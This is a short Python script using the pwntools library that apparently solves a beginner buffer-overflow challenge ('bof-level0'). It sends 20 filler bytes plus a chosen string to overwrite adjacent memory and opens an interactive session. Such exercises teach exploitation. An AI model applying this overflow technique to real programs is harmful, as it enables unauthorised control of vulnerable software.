#!/usr/bin/env python

from pwn import *

p = process('./bof-level0')

print(p.recv())

buf = "A" * 20
buf += "ABCDEFGH"

p.sendline(buf)

p.interactive()
